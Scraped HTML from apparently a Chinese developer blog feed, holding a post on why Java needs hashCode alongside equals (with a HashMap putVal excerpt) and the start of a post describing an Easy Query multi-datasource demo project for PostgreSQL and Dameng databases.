figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>早上在面一家公司的时候 被问到有了equals为什么还要hashcode方法
本来是一个比较简单的问题 但是在讲完各自的作用后想讲讲自己的理解的时候突然卡壳 所以写一篇文章来梳理一下这个逻辑</p>
<h2 data-id="heading-1">分析</h2>
<p>首先 equals和hashcode方法通常是成对出现的 在使用一些哈希结构的时候非常重要 比如HashMap HashTable等</p>
<ul>
<li>equals方法 用于判断两个对象是否相等 我们可以重写equals方法 来决定两个对象相等的逻辑 比如在String类中 重写了equals方法 认为两个字符串相等 那就是相等的</li>
<li>hashcode方法 返回一个整数哈希码 从而快速定位存储位置 提高查询效率</li>
</ul>
<p>理解完他们的作用后 我们来看一下HashMap的源码 我这里展示了put的部分源码</p>
<pre><code class="hljs language-ini" lang="ini">final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
               boolean evict) {
    Node&lt;K,V&gt;<span class="hljs-section">[]</span> tab<span class="hljs-comment">; Node&lt;K,V&gt; p; int n, i;</span>
    if ((<span class="hljs-attr">tab</span> = table) == null || (n = tab.length) == <span class="hljs-number">0</span>)
        <span class="hljs-attr">n</span> = (tab = resize()).length<span class="hljs-comment">;</span>
    if ((<span class="hljs-attr">p</span> = tab[i = (n - <span class="hljs-number">1</span>) &amp; hash]) == null)
        tab<span class="hljs-section">[i]</span> = newNode(hash, key, value, null)<span class="hljs-comment">;</span>
    else {
        Node&lt;K,V&gt; e<span class="hljs-comment">; K k;</span>
       //如果哈希值相等 
        if (<span class="hljs-attr">p.hash</span> == hash &amp;&amp;
        //判断地址相同 或者 逻辑相同
            ((<span class="hljs-attr">k</span> = p.key) == key || (key != null &amp;&amp; key.equals(k))))
            <span class="hljs-attr">e</span> = p<span class="hljs-comment">;</span>
        else if (p instanceof TreeNode)
            <span class="hljs-attr">e</span> = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value)<span class="hljs-comment">;</span>
        else {
            for (int <span class="hljs-attr">binCount</span> = <span class="hljs-number">0</span><span class="hljs-comment">; ; ++binCount) {</span>
                if ((<span class="hljs-attr">e</span> = p.next) == null) {
                    <span class="hljs-attr">p.next</span> = newNode(hash, key, value, null)<span class="hljs-comment">;</span>
                    if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st
                        treeifyBin(tab, hash)<span class="hljs-comment">;</span>
                    break<span class="hljs-comment">;</span>
                }
              //   //如果哈希值相等 
                if (<span class="hljs-attr">e.hash</span> == hash &amp;&amp;
                //地址相同 或者 逻辑相同
                    ((<span class="hljs-attr">k</span> = e.key) == key || (key != null &amp;&amp; key.equals(k))))
                    break<span class="hljs-comment">;</span>
</code></pre>
<p>通过查看源码可以发现 hashcode的计算值</p>
<ul>
<li>用于寻找插入位置 并且用于快速判断两个元素是否相同</li>
<li>如果相同再判断两个元素是否是同一个元素</li>
</ul>
<hr/>
<h2 data-id="heading-2">总结</h2>
<p>总的来说</p>
<blockquote>
<p>分为两方面 提高效率 保证对象唯一性</p>
</blockquote>
<p>hashcode提供了一种快速计算对象哈希值的方式 可以快速定位到元素应该存放在哪 提高了查询和存放效率</p>
<p>另外一方面 和equals做协同 保证数据的一致性和完整性  通过HashMap的源码也可以看到 他会缓存已有键值对的哈希码 用于快速判断元素是否存在   如果两个对象的hashcode值不同 那么就不可能是同一个对象 如果相同 再通过equals判断两个对象是否相等 既保证了正确性 又提高了性能</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Easy Query中间件的使用]]></title>    <link>https://juejin.cn/post/7595358285722533897</link>    <guid>https://juejin.cn/post/7595358285722533897</guid>    <pubDate>2026-01-15T08:13:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595358285722533897" data-draft-id="7595358285722419209" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Easy Query中间件的使用"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-15T08:13:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不素之客"/> <meta itemprop="url" content="https://juejin.cn/user/3881741097384843"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Easy Query中间件的使用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3881741097384843/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不素之客
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:13:59.000Z" title="Thu Jan 15 2026 08:13:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">项目简介</h2>
<p><code>easy-query-demo</code> 是一个基于 Spring Boot 的双库双表多数据源查询项目，演示如何使用 <strong>Easy Query ORM 框架</strong>实现以下功能：</p>
<ol>
<li><strong>同库联合查询</strong> - 在单个数据库内进行表关联查询</li>
<li><strong>跨库联合查询</strong> - 跨越两个数据库进行数据关联</li>
<li><strong>动态数据源切换</strong> - 使用注解方式动态切换数据源</li>
<li><strong>数据库函数适配</strong> - 自动适配不同数据库的 SQL 方言差异</li>
</ol>
<h3 data-id="heading-1">数据库架构</h3>
<p>本项目采用<strong>双库双表架构</strong>，每个数据库都包含完整的用户和产品数据：</p>























<table><thead><tr><th>数据库</th><th>用户表</th><th>产品表</th><th>用途</th></tr></thead><tbody><tr><td><strong>PostgreSQL</strong></td><td><code>t_user</code></td><td><code>t_product</code></td><td>主业务库（小写表名）</td></tr><tr><td><strong>达梦数据库</strong></td><td><code>T_USER</code></td><td><code>T_PRODUCT</code></td><td>国产数据库（大写表名）</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">核心特性</h2>
<h3 data-id="heading-3">1. 三种查询模式</h3>

























<table><thead><tr><th>模式</th><th>说明</th><th>API 前缀</th></tr></thead><tbody><tr><td><strong>PostgreSQL 同库查询</strong></td><td>在 PostgreSQL 内关联 <code>t_user</code> 和 <code>t_product</code></td><td><code>/api/query/pg/*</code></td></tr><tr><td><strong>达梦同库查询</strong></td><td>在达梦内关联 <code>T_USER</code> 和 <code>T_PRODUCT</code></td><td><code>/api/query/dm/*</code></td></tr><tr><td><strong>跨库联合查询</strong></td><td>PostgreSQL 与达梦之间的数据关联</td><td><code>/api/query/cross/*</code></td></tr></tbody></table>
<h3 data-id="heading-4">2. 动态数据源切换</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 使用注解方式切换数据源</span>
<span class="hljs-meta">@DataSource(DataSourceType.POSTGRESQL)</span>
<span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">queryPostgreSQL</span><span class="hljs-params">()</span> { ... }

<span class="hljs-meta">@DataSource(DataSourceType.DAMENG)</span>
<span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">queryDameng</span><span class="hljs-params">()</span> { ... }
</code></pre>
<h3 data-id="heading-5">3. 数据库函数适配</h3>
<p>自动适配不同数据库的 SQL 方言差异：</p>

























<table><thead><tr><th>函数</th><th>PostgreSQL</th><th>达梦数据库</th></tr></thead><tbody><tr><td>字符串连接</td><td><code>a||b</code></td><td><code>a + b</code></td></tr><tr><td>当前时间</td><td><code>CURRENT_TIMESTAMP</code></td><td><code>CURRENT_TIMESTAMP</code></td></tr><tr><td>日期格式化</td><td><code>TO_CHAR()</code></td><td><code>TO_CHAR()</code></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-6">项目架构</h2>
<h3 data-id="heading-7">分层架构</h3>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────────────┐
│                     Controller Layer                            │
│          UnifiedQueryController / FederatedQueryController      │
│              (REST API Endpoints)                                │
└───────────────────────────────┬─────────────────────────────────┘
                                │
┌───────────────────────────────▼─────────────────────────────────┐
│                      Service Layer                               │
│   SameDatabaseJoinService / FederatedQueryService               │
│    (Business Logic, Parallel Query, Data Combination)            │
└───────────────────────────────┬─────────────────────────────────┘
                                │
┌───────────────────────────────▼─────────────────────────────────┐
│                    Repository Layer                              │
│    UserRepository / ProductRepository / PgProductRepository       │
│         (Data Access with Easy Query)                            │
└───────────────────────────────┬─────────────────────────────────┘
                                │
┌───────────────────────────────▼─────────────────────────────────┐
│                   Entity Layer                                   │
│    User / Product / PgUser / PgProduct / DmUser / DmProduct      │
│            (Domain Models &amp; Proxy Classes)                       │
└───────────────────────────────┬─────────────────────────────────┘
                                │
┌───────────────────────────────▼─────────────────────────────────┐
│              Data Source &amp; Adapter Layer                        │
│   DynamicDataSource / DataSourceAspect / DatabaseFunctionAdapter  │
└───────────────────────────────┬─────────────────────────────────┘
                                │
    ┌───────────────────────────┴──────────────────────────┐
    │                                                        │
    ▼                                                        ▼
┌─────────────────┐                              ┌─────────────────┐
│   PostgreSQL    │                              │   Dameng DB     │
│   :<span class="hljs-number">5432</span>         │                              │   :<span class="hljs-number">5236</span>         │
│                 │                              │                 │
│ t_user +        │                              │ T_USER +        │
│ t_product       │                              │ T_PRODUCT       │
└─────────────────┘                              └─────────────────┘
</code></pre>
<h3 data-id="heading-8">项目目录结构</h3>
<pre><code class="hljs language-bash" lang="bash">easy-query-demo/
├── pom.xml                                          <span class="hljs-comment"># Maven 配置</span>
├── src/
│   ├── main/
│   │   ├── java/com/demo/easyquery/
│   │   │   ├── EasyQueryApplication.java             <span class="hljs-comment"># 启动类</span>
│   │   │   │
│   │   │   ├── config/                               <span class="hljs-comment"># 配置层</span>
│   │   │   │   ├── datasource/
│   │   │   │   │   ├── DataSourceType.java          <span class="hljs-comment"># 数据源类型枚举</span>
│   │   │   │   │   ├── DataSourceContextHolder.java <span class="hljs-comment"># 数据源上下文</span>
│   │   │   │   │   ├── DynamicDataSource.java        <span class="hljs-comment"># 动态数据源</span>
│   │   │   │   │   ├── @DataSource.java              <span class="hljs-comment"># 数据源切换注解</span>
│   │   │   │   │   └── DataSourceAspect.java         <span class="hljs-comment"># AOP 切面</span>
│   │   │   │   ├── adapter/
│   │   │   │   │   ├── DatabaseType.java             <span class="hljs-comment"># 数据库类型</span>
│   │   │   │   │   ├── DatabaseFunctionAdapter.java  <span class="hljs-comment"># 函数适配器接口</span>
│   │   │   │   │   ├── PostgreSQLFunctionAdapter.java
│   │   │   │   │   ├── DamengFunctionAdapter.java
│   │   │   │   │   └── DatabaseFunctionAdapterFactory.java
│   │   │   │   ├── DataSourceConfig.java            <span class="hljs-comment"># 双数据源配置</span>
│   │   │   │   └── EasyQueryConfig.java              <span class="hljs-comment"># EasyQuery 实例配置</span>
│   │   │   │
│   │   │   ├── entity/                               <span class="hljs-comment"># 实体层</span>
│   │   │   │   ├── User.java                         <span class="hljs-comment"># 通用用户实体</span>
│   │   │   │   ├── Product.java                      <span class="hljs-comment"># 通用产品实体</span>
│   │   │   │   ├── pg/
│   │   │   │   │   ├── PgUser.java                  <span class="hljs-comment"># PostgreSQL 用户实体</span>
│   │   │   │   │   └── PgProduct.java               <span class="hljs-comment"># PostgreSQL 产品实体</span>
│   │   │   │   └── dm/
│   │   │   │       ├── DmUser.java                  <span class="hljs-comment"># 达梦用户实体</span>
│   │   │   │       └── DmProduct.java               <span class="hljs-comment"># 达梦产品实体</span>
│   │   │   │
│   │   │   ├── repository/                           <span class="hljs-comment"># 数据访问层</span>
│   │   │   │   ├── pg/
│   │   │   │   │   ├── UserRepository.java          <span class="hljs-comment"># PG 用户仓储</span>
│   │   │   │   │   └── PgProductRepository.java     <span class="hljs-comment"># PG 产品仓储</span>
│   │   │   │   └── dm/
│   │   │   │       ├── DmUserRepository.java         <span class="hljs-comment"># DM 用户仓储</span>
│   │   │   │       └── ProductRepository.java       <span class="hljs-comment"># DM 产品仓储</span>
│   │   │   │
│   │   │   ├── service/                              <span class="hljs-comment"># 业务层</span>
│   │   │   │   ├── SameDatabaseJoinService.java      <span class="hljs-comment"># 同库关联查询</span>
│   │   │   │   ├── FederatedQueryService.java        <span class="hljs-comment"># 跨库联合查询</span>
│   │   │   │   ├── DynamicDataSourceService.java      <span class="hljs-comment"># 动态数据源演示</span>
│   │   │   │   └── UserService.java
│   │   │   │
│   │   │   ├── controller/                           <span class="hljs-comment"># 控制层</span>
│   │   │   │   ├── UnifiedQueryController.java        <span class="hljs-comment"># 统一查询控制器</span>
│   │   │   │   ├── FederatedQueryController.java     <span class="hljs-comment"># 联邦查询控制器</span>
│   │   │   │   ├── SameDatabaseJoinController.java   <span class="hljs-comment"># 同库关联查询控制器</span>
│   │   │   │   └── MultiDataSourceController.java    <span class="hljs-comment"># 多数据源控制器</span>
│   │   │   │
│   │   │   ├── dto/                                 <span class="hljs-comment"># 数据传输对象</span>
│   │   │   │   ├── UserProductDTO.java              <span class="hljs-comment"># PG 用户产品关联 DTO</span>
│   │   │   │   ├── UserProductStatsDTO.java         <span class="hljs-comment"># PG 用户产品统计 DTO</span>
│   │   │   │   ├── ProductBuyerStatsDTO.java        <span class="hljs-comment"># PG 产品买家统计 DTO</span>
│   │   │   │   ├── DmUserProductDTO.java            <span class="hljs-comment"># DM 用户产品关联 DTO</span>
│   │   │   │   └── DmProductBuyerStatsDTO.java      <span class="hljs-comment"># DM 产品买家统计 DTO</span>
│   │   │   │
│   │   │   └── dto/proxy/                           <span class="hljs-comment"># DTO 代理类（APT 生成）</span>
│   │   │       ├── UserProductDTOProxy.java
│   │   │       ├── UserProductStatsDTOProxy.java
│   │   │       ├── ProductBuyerStatsDTOProxy.java
│   │   │       ├── DmUserProductDTOProxy.java
│   │   │       └── DmProductBuyerStatsDTOProxy.java
│   │   │
│   │   └── resources/
│   │       ├── application.properties
│   │       └── application-datasource.properties
│   │
│   └── <span class="hljs-built_in">test</span>/                                          <span class="hljs-comment"># 测试代码</span>
│       └── java/com/demo/easyquery/
│           ├── FederatedQueryServiceTest.java
│           ├── MultiDataSourceTest.java
│           └── DatabaseComparisonTest.java
</code></pre>
<hr/>
